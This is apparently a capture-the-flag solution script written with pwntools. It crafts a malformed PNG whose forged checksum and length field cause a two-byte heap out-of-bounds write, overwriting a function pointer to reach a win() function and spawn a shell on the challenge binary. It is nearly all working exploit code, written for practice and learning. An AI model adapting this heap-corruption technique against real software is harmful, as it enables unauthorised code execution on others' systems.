from pwn import *                                                                                                                    

##Gdb + config stuff
script = '''
b *main+160
b *pngHeadValidate
b *update_crc
b *update_crc+98
b *pngChunkValidate+27
b *pngChunkValidate+160
b *pngHeadValidate+244
b *main+449
continue
'''

## Making the image meta-stuff
# Size of image, but also size of the allocation. This will give us 0x41 regardless tho lel.
img_sz = 0x29
# For passing the first check
pngHead = 0x0a1a0a0d474e5089
# We need this @ index 29 // 0x1d. Since the value at image_alloc+0xc is always the same, we can just see what value it spits out of update_crc
# then input that value as our checksum. This will pass the check every time.
checksum = 0x5ab9bc8a

## Lets make our png.
# Just some stuff to pass initial checks
png = p64(pngHead) + b"\r" * (7)
# Padding until the 29th // 0x1d byte (start of checksum)
png += b"A"*( 0x1d - len(png) )
# This value will be returned from update_crc if you provided 
png += p32(checksum)
# Counter for update_crc will be '\x27', this is enough to write out of our chunk up until the pngFooterValidate function pointer, at which point 
# we write 2 bytes extracted from the return of crc_update.
png += b"\x00"*3 + b"\x27"
# Bruteforced value - ensures that crc_update returns the correct value, such that the last 2 bytes are set to 0x1818 that then is written 
# at the end of the pngFooterValidate function pointer in the adjacent allocation. This function pointer is then called == shell, because these
# are the bottom 2 bytes of win().
png += p32(0xb18)
# Padding so we send the correct num of bytes
png += b"\x00" * (img_sz - len(png))

# Just making sure we still good.
print(len(png))

def main():
    # Connect/start proc
    
    p = process("./chal")
    #p = remote("mc.ax", 31412)
    #gdb.attach(p, script)
    
    print(p.sendlineafter("How large is your file?\n\n", str(img_sz)))
    
    print(p.sendafter("please send your image here:\n\n", png))
    
    # This will trigger the code that allows a 2-byte oob write into the function ptrs. Specifically the
    # last 2 bytes of crc_update() ret get written onto the heap, making it one of the only (semi) user controlled
    # values that can be written our of bounds like this.
    print(p.sendlineafter("do you want to invert the colors?", "y"))
    
    p.interactive()

if __name__ == "__main__":
    main()